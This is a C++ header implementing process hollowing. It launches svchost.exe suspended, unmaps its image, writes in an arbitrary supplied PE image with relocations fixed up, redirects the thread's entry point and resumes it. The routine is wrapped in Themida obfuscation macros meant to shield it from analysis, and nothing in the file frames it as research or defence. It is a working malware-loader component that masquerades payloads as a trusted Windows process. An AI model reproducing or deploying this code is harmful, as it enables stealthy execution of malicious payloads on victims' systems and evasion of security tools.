#pragma once

#include <windows.h>
#include <ThemidaSDK.h>

class ProcessHollowing
{
public:
	static HANDLE CreateHollowedProcess(void* image, int* code)
	{
		VM_FISH_RED_START
		STARTUPINFOA ProcessStartupInfo;
		PROCESS_INFORMATION ProcessInfo;

		ZeroMemory(
			&ProcessInfo,
			sizeof(ProcessInfo));

		ZeroMemory(&ProcessStartupInfo,
			sizeof(ProcessStartupInfo));

		ProcessStartupInfo.cb = sizeof(ProcessStartupInfo);

		BOOL isWOW64;
		IsWow64Process(GetCurrentProcess(), &isWOW64);

		char filepath[MAX_PATH];
		GetWindowsDirectoryA(filepath, sizeof(filepath));
		strcat(filepath, isWOW64 ? "\\SysWOW64\\svchost.exe" : "\\System32\\svchost.exe");

		if (!CreateProcessA(
			filepath,
			NULL,
			NULL,
			NULL,
			FALSE,
			CREATE_SUSPENDED,
			NULL,
			NULL,
			&ProcessStartupInfo,
			&ProcessInfo
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 1;
			return INVALID_HANDLE_VALUE;
		};

		PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)image;
		PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)image + lpDosHeader->e_lfanew);

		ULONG lpPreferableBase = lpNtHeader->OptionalHeader.ImageBase;

		CONTEXT ThreadContext;

		ZeroMemory(
			&ThreadContext,
			sizeof(CONTEXT));

		ThreadContext.ContextFlags = CONTEXT_INTEGER;

		if (!GetThreadContext(
			ProcessInfo.hThread,
			&ThreadContext
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 2;
			return INVALID_HANDLE_VALUE;
		}

		LPVOID lpPebImageBase;
		lpPebImageBase = (LPVOID)(ThreadContext.Ebx + 2 * sizeof(ULONG));

		SIZE_T stReadBytes;
		PVOID lpOriginalImageBase;

		ULONG dwOriginalImageBase;
		if (!ReadProcessMemory(
			ProcessInfo.hProcess,
			lpPebImageBase,
			&dwOriginalImageBase,
			sizeof(dwOriginalImageBase),
			&stReadBytes
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 3;
			return INVALID_HANDLE_VALUE;
		}
		
		lpOriginalImageBase = (PVOID)dwOriginalImageBase;

		if (lpOriginalImageBase == (LPVOID)lpPreferableBase)
		{
			HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
			FARPROC NtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");

			if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
				ProcessInfo.hProcess,
				lpOriginalImageBase
				))
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 4;
				return INVALID_HANDLE_VALUE;
			}
		}

		LPVOID lpAllocatedBase;
		if (!(lpAllocatedBase = VirtualAllocEx(
			ProcessInfo.hProcess,
			(LPVOID)lpPreferableBase,
			lpNtHeader->OptionalHeader.SizeOfImage,
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_EXECUTE_READWRITE
		)))
		{
			if (GetLastError() == ERROR_INVALID_ADDRESS)
			{
				if (!(lpAllocatedBase = VirtualAllocEx(
					ProcessInfo.hProcess,
					NULL,
					lpNtHeader->OptionalHeader.SizeOfImage,
					(MEM_COMMIT | MEM_RESERVE),
					PAGE_EXECUTE_READWRITE
				)))
				{
					TerminateProcess(ProcessInfo.hProcess, 0);
					*code = 5;
					return INVALID_HANDLE_VALUE;
				}
			}
			else
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 6;
				return INVALID_HANDLE_VALUE;
			}
		}

		if (lpOriginalImageBase != lpAllocatedBase)
		{
			SIZE_T stWrittenBytes;
			if (!WriteProcessMemory(
				ProcessInfo.hProcess,
				lpPebImageBase,
				&lpAllocatedBase,
				sizeof(lpAllocatedBase),
				&stWrittenBytes
			))
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 7;
				return INVALID_HANDLE_VALUE;
			}
		}

		lpNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

		if (lpAllocatedBase != (LPVOID)lpPreferableBase)
		{
			if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 8;
				return INVALID_HANDLE_VALUE;
			}
			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;

			DWORD lpRelocationTableBaseRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

			PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
			DWORD dwRelocationTableBaseOffset = 0;
			for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++)
			{
				if (lpRelocationTableBaseRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
					lpRelocationTableBaseRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize)
				{
					dwRelocationTableBaseOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpRelocationTableBaseRva - lpHeaderSection[dwSecIndex].VirtualAddress;
					break;
				}
			}

			LPVOID lpRelocationTableBase = (LPVOID)((DWORD_PTR)image + dwRelocationTableBaseOffset);
			DWORD dwRelocationTableSize = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocationTableSize;)
			{
				IMAGE_BASE_RELOCATION* lpBaseRelocBlock = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)lpRelocationTableBase + dwMemIndex);
				LPVOID lpBlocksEntery = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));

				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
				WORD* lpBlocks = (WORD*)lpBlocksEntery;

				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
				{
					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;

					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
					{
						DWORD dwAdrressToFixRva = lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset;

						lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
						DWORD dwAdrressToFixOffset = 0;
						for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++)
						{
							if (dwAdrressToFixRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
								dwAdrressToFixRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize)
							{
								dwAdrressToFixOffset = lpHeaderSection[dwSecIndex].PointerToRawData + dwAdrressToFixRva - lpHeaderSection[dwSecIndex].VirtualAddress;
								break;
							}
						}

						ULONG* lpAddressToFix = (ULONG*)((DWORD_PTR)image + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONG)lpAllocatedBase;
					}
				}
				
				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
			}
		}

		ThreadContext.Eax = (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;

		if (!SetThreadContext(
			ProcessInfo.hThread,
			&ThreadContext
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 9;
			return INVALID_HANDLE_VALUE;
		}

		SIZE_T stWrittenBytes;
		if (!WriteProcessMemory(
			ProcessInfo.hProcess,
			lpAllocatedBase,
			image,
			lpNtHeader->OptionalHeader.SizeOfHeaders,
			&stWrittenBytes
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 10;
			return INVALID_HANDLE_VALUE;
		}

		DWORD dwOldProtect;
		if (!VirtualProtectEx(
			ProcessInfo.hProcess,
			lpAllocatedBase,
			lpNtHeader->OptionalHeader.SizeOfHeaders,
			PAGE_READONLY,
			&dwOldProtect
		))
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 11;
			return INVALID_HANDLE_VALUE;
		}

		IMAGE_SECTION_HEADER* lpSectionHeaderArray = (IMAGE_SECTION_HEADER*)((ULONG_PTR)image + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

		for (int i = 0; i < lpNtHeader->FileHeader.NumberOfSections; i++)
		{
			if (!WriteProcessMemory(
				ProcessInfo.hProcess,
				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
				(LPCVOID)((DWORD_PTR)image + lpSectionHeaderArray[i].PointerToRawData),
				lpSectionHeaderArray[i].SizeOfRawData,
				&stWrittenBytes
			))
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 12;
				return INVALID_HANDLE_VALUE;
			}

			DWORD dwSectionMappedSize = 0;
			if (i == lpNtHeader->FileHeader.NumberOfSections - 1)
			{
				dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray[i].VirtualAddress;
			}
			else
			{
				dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress;
			}

			DWORD dwSectionProtection = 0;
			if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			{
				dwSectionProtection = PAGE_EXECUTE_READWRITE;
			}
			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ))
			{
				dwSectionProtection = PAGE_EXECUTE_READ;
			}
			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			{
				dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
			}
			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			{
				dwSectionProtection = PAGE_READWRITE;
			}
			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			{
				dwSectionProtection = PAGE_EXECUTE;
			}
			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ)
			{
				dwSectionProtection = PAGE_READONLY;
			}
			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			{
				dwSectionProtection = PAGE_WRITECOPY;
			}
			else
			{
				dwSectionProtection = PAGE_NOACCESS;
			}

			if (!VirtualProtectEx(
				ProcessInfo.hProcess,
				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
				dwSectionMappedSize,
				dwSectionProtection,
				&dwOldProtect
			))
			{
				TerminateProcess(ProcessInfo.hProcess, 0);
				*code = 13;
				return INVALID_HANDLE_VALUE;
			}
		}

		if (ResumeThread(
			ProcessInfo.hThread
		) == -1)
		{
			TerminateProcess(ProcessInfo.hProcess, 0);
			*code = 14;
			return INVALID_HANDLE_VALUE;
		}

		VM_FISH_RED_END
		return ProcessInfo.hProcess;
	}
};